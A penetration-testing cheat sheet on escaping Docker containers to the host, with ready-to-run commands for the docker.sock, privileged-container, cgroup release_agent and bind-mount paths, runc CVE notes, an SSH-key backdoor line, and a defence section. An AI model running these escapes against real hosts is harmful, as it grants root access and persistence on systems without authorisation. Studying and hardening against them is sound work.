# Docker Escape

> Container-to-host breakout paths. Authorized testing only. Map: MITRE ATT&CK T1611 Escape to Host.

## TL;DR
- Docker is namespace-isolation + seccomp/AppArmor — not a security boundary by itself. Misconfiguration converts it into one anyway.
- Five canonical escape paths: (1) mounted `docker.sock`, (2) `--privileged`, (3) `CAP_SYS_ADMIN` + cgroups, (4) Docker daemon vulns (runc, etc.), (5) writable host paths via bind mounts.
- Inside a container, fingerprint with `cat /proc/1/cgroup`, `ls /.dockerenv`, `mount | grep overlay`. Capability set: `capsh --print` (install `libcap2-bin`).
- Defenders: rootless Docker / Podman, drop ALL capabilities, read-only root FS, seccomp default + custom profile, no host volume mounts.

## Detection / Discovery

### Confirm you're inside a container
| Command | Description |
| --- | --- |
| `cat /proc/1/cgroup` | Look for `/docker/` or `/kubepods/` segments |
| `ls /.dockerenv` | Existence = Docker runtime |
| `cat /proc/self/status \| grep -E '(CapEff\|CapPrm)'` | Effective capability set (hex bitmap) |
| `capsh --decode=$(grep CapEff /proc/self/status \| awk '{print $2}')` | Human-readable cap list |
| `mount` | Look for `overlay` / `tmpfs` patterns |
| `env \| grep KUBERNETES` | K8s? See [./kubernetes-attack-paths.md](./kubernetes-attack-paths.md) |

### Enumerate the host surface from inside
| Command | Description |
| --- | --- |
| `ls -la /var/run/docker.sock` | Host socket mounted? → instant escape |
| `ls -la /` | World-writable host paths? |
| `mount \| grep -E '(host\|/etc\|/var/log)'` | Bind mounts giving access to host paths |
| `ip route` | Default route target (often the host's docker0 bridge) |
| `nmap -p- <docker0-gw>` | Probe host from container network |

## Exploitation

### (1) Mounted `/var/run/docker.sock`
Most common misconfiguration. The socket is a UID-0-equivalent on the host:
```bash
# Inside the container
docker -H unix:///var/run/docker.sock run -it --rm \
  -v /:/host --pid=host --privileged ubuntu chroot /host bash
```
Now in a root shell on the host filesystem.

### (2) `--privileged` container
`--privileged` clears all capability drops, all seccomp profiles, and gives full `/dev` access. From inside:
```bash
# Mount the host root device directly
fdisk -l                        # find the host root device (e.g. /dev/sda1)
mkdir /mnt/host && mount /dev/sda1 /mnt/host
chroot /mnt/host bash
```

### (3) `CAP_SYS_ADMIN` cgroup release_agent escape
With `CAP_SYS_ADMIN` (often granted unintentionally) and access to a writable `cgroup` filesystem:
```bash
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release

# Find host path of /tmp/cmd from the container's overlay
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent

cat > /tmp/cmd <<'EOF'
#!/bin/sh
ip a > /tmp/output
EOF
chmod +x /tmp/cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"   # trigger
cat /tmp/output                                 # host's ip a
```
Reference: https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/

### (4) Docker / runc vulnerabilities
- **CVE-2019-5736** (runc) — write to `/proc/self/exe` from a privileged container overwrites the host's runc binary. Patched in runc 1.0-rc7+; verify the host runtime version.
- **CVE-2024-21626** (runc "Leaky Vessels") — file-descriptor leak through `WORKDIR /proc/self/fd/N` lets the container access the host's directory. Patched in runc 1.1.12 / 1.2.0-rc1+.
- **CVE-2022-0492** (cgroupv1) — unprivileged `unshare` + `release_agent` write enables a similar escape on hosts with cgroupv1 and a permissive AppArmor profile.

Check host runtime version (if you can reach the daemon):
```bash
docker version
# Server: Containerd <ver>, runc <ver>
```

### (5) Bind-mounted sensitive paths
| Mount | Why bad |
| --- | --- |
| `-v /:/host` | Trivially escape via chroot |
| `-v /var/run/docker.sock:/var/run/docker.sock` | Path (1) |
| `-v /proc:/host/proc` | Read host kernel state, modify via `/proc/sys` |
| `-v /etc:/host-etc` | Read SSH keys, shadow, sudoers; potentially write |
| `-v /var/log:/var/log` | Write to host logs (anti-forensics) |

Generic exploit pattern:
```bash
find / -path '*ssh*' -name 'authorized_keys' 2>/dev/null
echo "ssh-ed25519 AAAA... attacker" >> /host-etc/.ssh/authorized_keys
```

## Bypasses
- AppArmor `docker-default` denies most `/proc/sys/*` writes; profile-bypass requires `--security-opt apparmor=unconfined`.
- Seccomp default profile blocks ~50 syscalls; `--security-opt seccomp=unconfined` (or `--privileged`) removes that.
- User-namespace remapping turns container-root → unprivileged host UID; `userns-remap` + `--userns=host` are mutually exclusive; verify with `cat /proc/self/uid_map`.

## Defence / Remediation
- **Rootless Docker / Podman** — daemon runs as the invoking user, escape lands as that user, not root.
- **Drop ALL capabilities** then add back only what's needed: `--cap-drop=ALL --cap-add=NET_BIND_SERVICE`.
- **Read-only root FS** (`--read-only`) + tmpfs mounts for writable paths.
- **No `--privileged`** in production. If you need GPU/USB/Docker-in-Docker, use the minimal `--device` flags or a sidecar pattern.
- **Don't mount `docker.sock`**. If a service needs to manage other containers, use a scoped REST proxy (e.g., `docker-socket-proxy`).
- **Seccomp custom profiles** (block `unshare`, `clone`, `mount`, `keyctl`, `pivot_root`, `ptrace`).
- **User-namespace remap** (`userns-remap` in daemon.json) — container root != host root.
- **Read-only mounts** for any host path that doesn't need writes (`:ro`).
- **Falco** / **Tetragon** for runtime detection of suspicious syscalls inside containers (chroot, mount, ptrace).
- **Image vulnerability scanning** at build + at deploy (Trivy / Grype) — see [./image-scanning.md](./image-scanning.md).

## Sources
- Trail of Bits — Understanding Docker container escapes: https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/
- HackTricks Docker breakout: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/docker-breakout/docker-breakout-privilege-escalation.html
- runc CVE-2019-5736 advisory: https://github.com/advisories/GHSA-fh74-hm69-rqjw
- Snyk "Leaky Vessels" (CVE-2024-21626): https://snyk.io/blog/leaky-vessels-docker-runc-container-breakout-vulnerabilities/
- Docker security best practices: https://docs.docker.com/engine/security/
- MITRE ATT&CK T1611 Escape to Host: https://attack.mitre.org/techniques/T1611/
- Falco: https://falco.org/docs/
